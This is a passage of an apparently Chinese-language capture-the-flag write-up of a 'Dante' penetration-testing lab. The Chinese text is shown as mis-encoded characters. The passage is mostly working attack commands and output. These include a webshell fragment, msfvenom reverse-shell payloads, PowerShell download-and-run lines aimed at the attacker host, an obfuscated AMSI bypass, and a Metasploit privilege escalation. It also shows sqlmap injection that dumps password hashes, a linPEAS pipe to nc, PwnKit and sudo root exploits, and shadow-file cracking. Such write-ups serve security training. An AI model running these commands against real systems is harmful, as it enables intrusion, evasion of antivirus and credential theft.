            <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">]</span><span class="o">=</span><span class="nf">encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>å¾—åˆ° webshell åå¯ä»¥åœ¨ C:\Users\gerald\Desktop ä¸‹æ‰¾åˆ° flag.txt</p>

<p>Godzilla ä¸­ç›´æ¥åå¼¹ msf meterpreter ä¼šæ–­æ‰ï¼Œç”Ÿæˆä¸€ä¸ª msf windows https è½½è·ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_https <span class="nv">LHOST</span><span class="o">=</span>10.10.14.5 <span class="nv">LPORT</span><span class="o">=</span>8443 <span class="nt">-f</span> exe <span class="nt">-o</span> wintest.txt
</code></pre></div></div>
<p>msfconsole ä¸­æ‰§è¡Œï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>payload payload/windows/x64/meterpreter/reverse_https
<span class="nb">set </span>LPOrt 8443
<span class="nb">set </span>exitonsession <span class="nb">false
</span>exploit <span class="nt">-j</span>
</code></pre></div></div>
<p>åœ¨ webshell ä¸­ç”¨ wget ä¸‹è½½è½½è·ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell wget http://10.10.14.5:9999/wintest.txt <span class="nt">-o</span> test.exe
</code></pre></div></div>
<p>æ‰§è¡Œåå¯ä»¥å¾—åˆ° meterpreterã€‚</p>
<h2 id="ææƒä¿¡æ¯æ”¶é›†-winpeas">ææƒä¿¡æ¯æ”¶é›†: winPEAS</h2>
<p>è¿œç¨‹åŠ è½½ PowerSharpPack.ps1</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iex<span class="o">(</span>new-object net.webclient<span class="o">)</span>.downloadstring<span class="o">(</span><span class="s1">'http://10.10.14.5:9999/PowerSharpPack.ps1'</span><span class="o">)</span>
</code></pre></div></div>
<p>åŠ è½½æ—¶è¿”å›ä¸‹é¢çš„æŠ¥é”™ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰ç»•è¿‡ AMSIã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>This script contains malicious content and has been blocked by your antivirus software.
</code></pre></div></div>
<p>ç»•è¿‡ AMSIï¼š</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$x</span><span class="o">=</span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.Am'</span><span class="o">+</span><span class="s1">'siUt'</span><span class="o">+</span><span class="s1">'ils'</span><span class="p">);</span><span class="nv">$y</span><span class="o">=</span><span class="nv">$x</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'am'</span><span class="o">+</span><span class="s1">'siCon'</span><span class="o">+</span><span class="s1">'text'</span><span class="p">,[</span><span class="n">Reflection.BindingFlags</span><span class="p">]</span><span class="s1">'NonPublic,Static'</span><span class="p">);</span><span class="nv">$z</span><span class="o">=</span><span class="nv">$y</span><span class="o">.</span><span class="nf">GetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">);[</span><span class="n">Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">WriteInt32</span><span class="p">(</span><span class="nv">$z</span><span class="p">,</span><span class="mi">0</span><span class="n">x41424344</span><span class="p">)</span><span class="w">

</span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">system.net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://10.10.14.5:9999/amsi_rmouse.txt'</span><span class="p">)</span><span class="o">|</span><span class="nx">IEX</span><span class="w">
</span></code></pre></div></div>
<p>å†æ¬¡åŠ è½½ PowerSharpPack.ps1</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://10.10.14.5:9999/PowerSharpPack.ps1'</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>
<p>æ‰§è¡Œ winPEAS ç»„ä»¶ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PowerSharpPack <span class="nt">-winPEAS</span>
</code></pre></div></div>
<p>æ‰§è¡Œä¹‹åå¯ä»¥å¾—åˆ°å¤§é‡çš„è¾“å‡ºã€‚</p>
<ol>
  <li>å­˜åœ¨å†å²æ¼æ´ CVE-2019-1385ã€CVE-2019-1405
    <div class="language-bash highlighter-rouge">
<div class="highlight"><pre class="highlight"><code> <span class="o">[</span>?] Windows vulns search powered by Watson<span class="o">(</span>https://github.com/rasta-mouse/Watson<span class="o">)</span>
     OS Build Number: 18363
     <span class="o">[!]</span> CVE-2019-1385 : VULNERABLE
         <span class="o">[&gt;]</span> https://www.youtube.com/watch?v<span class="o">=</span>K6gHnr-VkAg

     <span class="o">[!]</span> CVE-2019-1405 : VULNERABLE
         <span class="o">[&gt;]</span> https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/ 
</code></pre></div>    </div>
  </li>
  <li>Interesting Services -non Microsoft
    <ol>
      <li>Druva</li>
      <li>OpenSSH</li>
    </ol>
  </li>
  <li>DLL åŠ«æŒè·¯å¾„
    <div class="language-plaintext highlighter-rouge">
<div class="highlight"><pre class="highlight"><code> C:\WINDOWS\system32
 C:\WINDOWS
 C:\WINDOWS\System32\Wbem
 C:\WINDOWS\System32\WindowsPowerShell\v1.0\
 C:\WINDOWS\System32\OpenSSH\
</code></pre></div>    </div>
  </li>
</ol>

<h2 id="ææƒcve-2019-1405æœªæˆåŠŸ">ææƒï¼šCVE-2019-1405(æœªæˆåŠŸ)</h2>
<p>å½“ Windows é€šç”¨å³æ’å³ç”¨ (UPnP) æœåŠ¡ä¸æ­£ç¡®åœ°å…è®¸ COM å¯¹è±¡åˆ›å»ºæ—¶ï¼Œå°±ä¼šå­˜åœ¨æƒé™æå‡æ¼æ´ï¼Œå› æ­¤è¯¥æ¼æ´ä¹Ÿè¢«ç§°ä¸ºâ€Windows UPnP æœåŠ¡æƒé™æå‡æ¼æ´â€ã€‚</p>

<p>Exp</p>
<ul>
  <li>https://github.com/apt69/COMahawk</li>
  <li>https://github.com/Al1ex/WindowsElevation/tree/master/CVE-2019-1405</li>
</ul>

<p>ä¸Šä¼  expï¼Œæ‰§è¡ŒåæœªæˆåŠŸã€‚</p>

<h2 id="æ¼æ´æœåŠ¡ææƒdruva">æ¼æ´æœåŠ¡ææƒï¼ˆDruvaï¼‰</h2>
<p>winPEAS å¯¹é Microsoft çš„æœåŠ¡è¿›è¡Œæ‰«ææ—¶ï¼Œæ‰«æå‡ºäº†ä¸€ä¸ª Druva æœåŠ¡ã€‚</p>

<p>msf æœç´¢ Druva å¯ä»¥å¾—åˆ°ä¸€ä¸ªææƒ expã€‚</p>
<ul>
  <li>exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc</li>
</ul>

<p>Druva çš„ç‰ˆæœ¬ä¿¡æ¯å¯ä»¥é€šè¿‡æŸ¥çœ‹ licence.txt æ–‡ä»¶è·å–ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type</span> <span class="s2">"c:</span><span class="se">\P</span><span class="s2">rogram Files (x86)</span><span class="se">\D</span><span class="s2">ruva</span><span class="se">\i</span><span class="s2">nSync</span><span class="se">\l</span><span class="s2">icence.txt"</span>
Druva InSync 6.6.3
Copyright <span class="o">(</span>c<span class="o">)</span> 2019 Druva Inc. 
</code></pre></div></div>
<p>6.6.3 ç‰ˆæœ¬ä¹Ÿåœ¨ exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc çš„åˆ©ç”¨èŒƒå›´å†…ã€‚</p>

<p>åˆ©ç”¨åå¯ä»¥å¾—åˆ° SYSTEM æƒé™ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.14.5
LHOST <span class="o">=&gt;</span> 10.10.14.5
msf6 exploit<span class="o">(</span>windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT 5555
msf6 exploit<span class="o">(</span>windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>session 39
session <span class="o">=&gt;</span> 39
msf6 exploit<span class="o">(</span>windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.5:5555 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Running automatic check <span class="o">(</span><span class="s2">"set AutoCheck false"</span> to disable<span class="o">)</span>
<span class="o">[!]</span> The service is running, but could not be validated. Service <span class="s1">'inSyncCPHService'</span> exists.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting to 127.0.0.1:6064 ...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending packet <span class="o">(</span>260 bytes<span class="o">)</span> to 127.0.0.1:6064 ...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>175686 bytes<span class="o">)</span> to 10.10.110.3
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 41 opened <span class="o">(</span>10.10.14.5:5555 -&gt; 10.10.110.3:21927<span class="o">)</span> at 2023-12-26 20:01:51 <span class="nt">-0500</span>

meterpreter <span class="o">&gt;</span>
</code></pre></div></div>

<h1 id="linux-17216112">Linux: 172.16.1.12</h1>
<p>å¼€æ”¾ç«¯å£ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.16.1.12	21
172.16.1.12	80
172.16.1.12	22
172.16.1.12	443
172.16.1.12	3306
</code></pre></div></div>
<h2 id="80-ç«¯å£-sql-æ³¨å…¥">80 ç«¯å£ SQL æ³¨å…¥</h2>
<p>80 ç«¯å£ä¹Ÿæ˜¯ä¸€ä¸ª xampp æœåŠ¡ï¼Œä¸ 172.16.1.13 çš„ç‰ˆæœ¬åŸºæœ¬ä¸€è‡´ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python /webtools/dirscan/dirsearch/dirsearch.py <span class="nt">-u</span> http://172.16.1.12 <span class="nt">-e</span> php <span class="nt">-p</span> socks5://localhost:1080 <span class="nt">-w</span> /webtools/dicts/SecLists/Discovery/Web-Content/common.txt

<span class="o">[</span>20:11:05] Starting:                                                                                                                                            
<span class="o">[</span>20:11:27] 301 -  232B  - /blog  -&gt;  http://172.16.1.12/blog/               
<span class="o">[</span>20:11:31] 403 -    1KB - /cgi-bin/                                         
<span class="o">[</span>20:11:37] 301 -  237B  - /dashboard  -&gt;  http://172.16.1.12/dashboard/     
<span class="o">[</span>20:11:47] 200 -   30KB - /favicon.ico                                      
<span class="o">[</span>20:11:56] 301 -  231B  - /img  -&gt;  http://172.16.1.12/img/                 
<span class="o">[</span>20:12:17] 403 -    1KB - /phpmyadmin                                       
<span class="o">[</span>20:12:48] 301 -  237B  - /webalizer  -&gt;  http://172.16.1.12/webalizer/  
</code></pre></div></div>
<p>æ‰«æåˆ°ä¸€ä¸ª /blog ç›®å½•ã€‚</p>

<p>æ ¹æ®åšå®¢çš„ footer ä¿¡æ¯ï¼š<code class="language-plaintext highlighter-rouge">Responsive Blog Site 2023 - Brought To You by Ser Bermz</code> å¯ä»¥æ‰¾åˆ°è¯¥ CMS çš„ç›¸å…³ä¿¡æ¯ï¼šhttps://www.youtube.com/channel/UCsFgC9ggwrmYR2XqEHXpbNg</p>

<table>
  <tbody>
    <tr>
      <td>è¿›ä¸€æ­¥å®šä½åˆ°æºç ï¼š[Responsive Online Blog Website Using PHP/MySQL</td>
      <td>CampCodes](https://www.campcodes.com/projects/php/responsive-online-blog-website-using-php-mysql-free-download/)</td>
    </tr>
  </tbody>
</table>

<p>åœ¨ exploitdb ä¸­å¯ä»¥æŸ¥è¯¢åˆ°è¯¥ CMS çš„å†å²æ¼æ´</p>
<ul>
  <li><a href="https://www.exploit-db.com/exploits/48615">Responsive Online Blog 1.0 - â€˜idâ€™ SQL Injection - PHP webapps Exploit</a></li>
</ul>

<p>POC:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="s1">'http://172.16.1.12/blog/category.php?id=1'</span> <span class="nt">--dbs</span> <span class="nt">--batch</span> <span class="nt">--proxy</span> socks5://localhost:1080
</code></pre></div></div>
<p>æšä¸¾å‡ºæ‰€æœ‰çš„æ•°æ®åº“</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET parameter <span class="s1">'id'</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N] N
sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 202 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
<span class="nt">---</span>
Parameter: <span class="nb">id</span> <span class="o">(</span>GET<span class="o">)</span>
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <span class="nb">id</span><span class="o">=</span>1<span class="s1">' RLIKE (SELECT (CASE WHEN (1163=1163) THEN 1 ELSE 0x28 END))-- mDDs

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1'</span> AND <span class="o">(</span>SELECT 3351 FROM<span class="o">(</span>SELECT COUNT<span class="o">(</span><span class="k">*</span><span class="o">)</span>,CONCAT<span class="o">(</span>0x7176626a71,<span class="o">(</span>SELECT <span class="o">(</span>ELT<span class="o">(</span><span class="nv">3351</span><span class="o">=</span>3351,1<span class="o">)))</span>,0x71706b6a71,FLOOR<span class="o">(</span>RAND<span class="o">(</span>0<span class="o">)</span><span class="k">*</span>2<span class="o">))</span>x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x<span class="o">)</span>a<span class="o">)</span><span class="nt">--</span> QmkZ

    Type: time-based blind
    Title: MySQL <span class="o">&gt;=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span>
    Payload: <span class="nb">id</span><span class="o">=</span>1<span class="s1">' AND (SELECT 5794 FROM (SELECT(SLEEP(5)))qeMR)-- MjCh

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=-4778'</span> UNION ALL SELECT NULL,CONCAT<span class="o">(</span>0x7176626a71,0x50687146794d544756786254455a6153556a736c776e696c6e77516c78476a454c636c727474756d,0x71706b6a71<span class="o">)</span><span class="c">#</span>
<span class="nt">---</span>
<span class="o">[</span>20:46:01] <span class="o">[</span>INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7, Apache 2.4.43
back-end DBMS: MySQL <span class="o">&gt;=</span> 5.0 <span class="o">(</span>MariaDB fork<span class="o">)</span>
<span class="o">[</span>20:46:03] <span class="o">[</span>INFO] fetching database names
<span class="o">[</span>20:46:06] <span class="o">[</span>INFO] retrieved: <span class="s1">'information_schema'</span>
<span class="o">[</span>20:46:07] <span class="o">[</span>INFO] retrieved: <span class="s1">'test'</span>
<span class="o">[</span>20:46:08] <span class="o">[</span>INFO] retrieved: <span class="s1">'performance_schema'</span>
<span class="o">[</span>20:46:09] <span class="o">[</span>INFO] retrieved: <span class="s1">'flag'</span>
<span class="o">[</span>20:46:10] <span class="o">[</span>INFO] retrieved: <span class="s1">'mysql'</span>
<span class="o">[</span>20:46:11] <span class="o">[</span>INFO] retrieved: <span class="s1">'blog_admin_db'</span>
<span class="o">[</span>20:46:12] <span class="o">[</span>INFO] retrieved: <span class="s1">'phpmyadmin'</span>
available databases <span class="o">[</span>7]:                                                                                                                                       
<span class="o">[</span><span class="k">*</span><span class="o">]</span> blog_admin_db
<span class="o">[</span><span class="k">*</span><span class="o">]</span> flag
<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema
<span class="o">[</span><span class="k">*</span><span class="o">]</span> mysql
<span class="o">[</span><span class="k">*</span><span class="o">]</span> performance_schema
<span class="o">[</span><span class="k">*</span><span class="o">]</span> phpmyadmin
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">test</span>
</code></pre></div></div>
<p>é€æ­¥è·å– flag æ•°æ®åº“ä¸­çš„å­—æ®µã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="s1">'http://172.16.1.12/blog/category.php?id=1'</span> <span class="nt">--dbs</span> <span class="nt">--batch</span> <span class="nt">--proxy</span> socks5://localhost:1080 <span class="nt">-D</span> flag <span class="nt">-T</span> flag <span class="nt">-C</span> flag <span class="nt">--dump</span>

<span class="o">[</span>20:48:28] <span class="o">[</span>INFO] fetching entries of column<span class="o">(</span>s<span class="o">)</span> <span class="s1">'flag'</span> <span class="k">for </span>table <span class="s1">'flag'</span> <span class="k">in </span>database <span class="s1">'flag'</span>
Database: flag
Table: flag
<span class="o">[</span>1 entry]
+------------------------------+
| flag                         |
+------------------------------+
| DANTE<span class="o">{</span>wHy_y0U_n0_s3cURe?!?!<span class="o">}</span> |
+------------------------------+
</code></pre></div></div>

<p>ä½¿ç”¨ â€“os-shell æ— æ³•å†™å…¥ webshellï¼Œå¯èƒ½æ˜¯æ²¡æœ‰å†™æƒé™ï¼Œæ— æ³•æˆåŠŸã€‚</p>

<p>å°è¯•åœ¨ blog_admin_db ä¸­å¯»æ‰¾ä¸€äº›æ•æ„Ÿä¿¡æ¯ã€‚æšä¸¾æ‰€æœ‰ç”¨æˆ·ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="s1">'http://172.16.1.12/blog/category.php?id=1'</span> <span class="nt">--batch</span> <span class="nt">--proxy</span> socks5://localhost:1080 <span class="nt">--technique</span> U <span class="nt">-D</span> blog_admin_db <span class="nt">-T</span> membership_users <span class="nt">--dump</span>
</code></pre></div></div>

<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin	21232f297a57a5a743894a0e4a801fc3 <span class="o">(</span>admin<span class="o">)</span>
egre55	d6501933a2e0ea1f497b87473051417f
<span class="nb">test	</span>098f6bcd4621d373cade4e832627b4f6 <span class="o">(</span><span class="nb">test</span><span class="o">)</span>
test1	739969b53246b2c727850dbb3490ede6 <span class="o">(</span>test9<span class="o">)</span>
test2	ad0234829205b9033196ba818f7a872b <span class="o">(</span>test2<span class="o">)</span>
memberID	passMD5
ben	442179ad1de9c25593cabf625c0badb7
</code></pre></div></div>
<h2 id="md5-çˆ†ç ´john">MD5 çˆ†ç ´ï¼ˆjohnï¼‰</h2>
<p>ben ç”¨æˆ·çš„ hash å¯ä»¥ä½¿ç”¨ john è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°å¯†ç : Welcometomyblog</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--wordlist</span><span class="o">=</span>/webtools/dicts/rockyou.txt md5hash <span class="nt">--format</span><span class="o">=</span>Raw-MD5
</code></pre></div></div>

<p>ä½¿ç”¨ä¸Šé¢çš„å‡­è¯ç™»é™† sshï¼Œadmin ç”¨æˆ·å¾—åˆ° Permission deniedï¼Œben ç”¨æˆ·å¯ä»¥æˆåŠŸç™»é™†ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> ssh ben@172.16.1.12
</code></pre></div></div>
<p>ä½¿ç”¨ linPEAS è¿›è¡Œææƒä¿¡æ¯æ”¶é›†</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># linPEAS</span>
nc <span class="nt">-lvnp</span> 9002 | <span class="nb">tee </span>linpeas.out <span class="c">#Host</span>
wget <span class="nt">-q</span> <span class="nt">-O-</span> 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002 <span class="c">#Victim</span>
</code></pre></div></div>

<h2 id="ææƒ-pwnkit">ææƒ: PwnKit</h2>
<p>linPEAS æ‰«æå‡ºè¾ƒå¤šææƒæ¼æ´:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] <span class="o">[</span>CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: <span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=</span>10|11|12|13|14|15|16|17|18|19|20|21 <span class="o">]</span>,debian<span class="o">=</span>7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

<span class="o">[</span>+] <span class="o">[</span>CVE-2021-3156] <span class="nb">sudo </span>Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: <span class="nv">mint</span><span class="o">=</span>19,[ <span class="nv">ubuntu</span><span class="o">=</span>18|20 <span class="o">]</span>, <span class="nv">debian</span><span class="o">=</span>10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

<span class="o">[</span>+] <span class="o">[</span>CVE-2021-3156] <span class="nb">sudo </span>Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: <span class="nv">centos</span><span class="o">=</span>6|7|8,[ <span class="nv">ubuntu</span><span class="o">=</span>14|16|17|18|19|20 <span class="o">]</span>, <span class="nv">debian</span><span class="o">=</span>9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

<span class="o">[</span>+] <span class="o">[</span>CVE-2022-32250] nft_object UAF <span class="o">(</span>NFT_MSG_NEWSET<span class="o">)</span>

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: <span class="nv">ubuntu</span><span class="o">=(</span>22.04<span class="o">){</span>kernel:5.15.0-27-generic<span class="o">}</span>
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone<span class="o">=</span>1 required <span class="o">(</span>to obtain CAP_NET_ADMIN<span class="o">)</span>

<span class="o">[</span>+] <span class="o">[</span>CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: <span class="nv">ubuntu</span><span class="o">=(</span>20.04<span class="o">){</span>kernel:5.12.13<span class="o">}</span>
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone<span class="o">=</span>1 required <span class="o">(</span>to obtain CAP_NET_ADMIN<span class="o">)</span>

<span class="o">[</span>+] <span class="o">[</span>CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: <span class="nv">ubuntu</span><span class="o">=</span>20.04<span class="o">{</span>kernel:5.8.0-<span class="k">*</span><span class="o">}</span>
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

<span class="o">[</span>+] <span class="o">[</span>CVE-2019-18634] <span class="nb">sudo </span>pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: <span class="nv">mint</span><span class="o">=</span>19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: <span class="nb">sudo </span>configuration requires pwfeedback to be enabled.

<span class="o">[</span>+] <span class="o">[</span>CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id<span class="o">=</span>1072
   Exposure: less probable
   Tags: <span class="nv">ubuntu</span><span class="o">=</span>16.04<span class="o">{</span>ntfs-3g:2015.3.14AR.1-1build1<span class="o">}</span>,debian<span class="o">=</span>7.0<span class="o">{</span>ntfs-3g:2012.1.15AR.5-2.1+deb7u2<span class="o">}</span>,debian<span class="o">=</span>8.0<span class="o">{</span>ntfs-3g:2014.2.15AR.2-1+deb8u2<span class="o">}</span>
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.

</code></pre></div></div>
<p>Pwnkit å¯æˆåŠŸææƒã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ben@DANTE-NIX04:~/.tmp<span class="nv">$ </span>./.pw
root@DANTE-NIX04:/home/ben/.tmp# 
</code></pre></div></div>
<h2 id="ææƒ-sudo--1828">ææƒ: sudo &lt; 1.8.28</h2>
<p>sudo ç‰ˆæœ¬ä¸º 1.8.27ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ben@DANTE-NIX04:~/.tmp<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-V</span>
Sudo version 1.8.27
Sudoers policy plugin version 1.8.27
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.27 
</code></pre></div></div>
<p>hacktricks ä¸­è®°å½•äº†ä¸€ä¸ª sudo ç‰ˆæœ¬å°äº 1.8.28 çš„ payload</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
</code></pre></div></div>
<p>å¯ä»¥ç›´æ¥ææƒåˆ° root</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ben@DANTE-NIX04:~/.tmp<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
root@DANTE-NIX04:/home/ben/.tmp# 
</code></pre></div></div>

<p>/etc/shadow æ–‡ä»¶ä¸­åŒ…å«äº†ä¸€ä¸ªæç¤ºï¼šCrackMeã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>julian:<span class="nv">$1$CrackMe$U93HdchOpEUP9iUxGVIvq</span>/:18439:0:99999:7:::
</code></pre></div></div>
<p>å°† /etc/passwd å’Œ /etc/shadow æ–‡ä»¶ä¿å­˜åˆ°æœ¬åœ°ï¼Œä½¿ç”¨ unshadow ç»„åˆæˆä¸€ä¸ªæ–‡ä»¶ï¼Œåˆ é™¤æ–‡ä»¶ä¸­çš„å…¶ä»–è¡Œï¼Œåªç•™ä¸‹ julianï¼Œæœ€åä½¿ç”¨ john çˆ†ç ´ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unshadow 172.16.1.12_etc_passwd 172.16.1.12_shadowhash <span class="o">&gt;</span> 172.16.1.12_unshadow

john <span class="nt">--wordlist</span><span class="o">=</span>/webtools/dicts/rockyou.txt 172.16.1.12_unshadow
</code></pre></div></div>
<p>ç¬¬ä¸€æ¬¡çˆ†ç ´æ²¡æœ‰å¾—åˆ°ç»“æœï¼Œä½† john æç¤ºæˆ‘ä»¬ä½¿ç”¨å‚æ•° <code class="language-plaintext highlighter-rouge">--format=md5crypt-long</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: detected <span class="nb">hash type</span> <span class="s2">"md5crypt"</span>, but the string is also recognized as <span class="s2">"md5crypt-long"</span>
Use the <span class="s2">"--format=md5crypt-long"</span> option to force loading these as that <span class="nb">type </span>instead
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
0g 0:00:00:19 DONE <span class="o">(</span>2023-12-27 07:13<span class="o">)</span> 0g/s 712123p/s 712123c/s 712123C/s <span class="o">!!!</span>0mc3t..<span class="k">*</span>7Â¡Vamos!
Session completed. 
</code></pre></div></div>
<p>æŒ‡å®šæ–°çš„åŠ å¯†æ–¹å¼åå¯ä»¥æ­£å¸¸è·‘å‡ºæ˜æ–‡ä¸º manchesterunited</p>
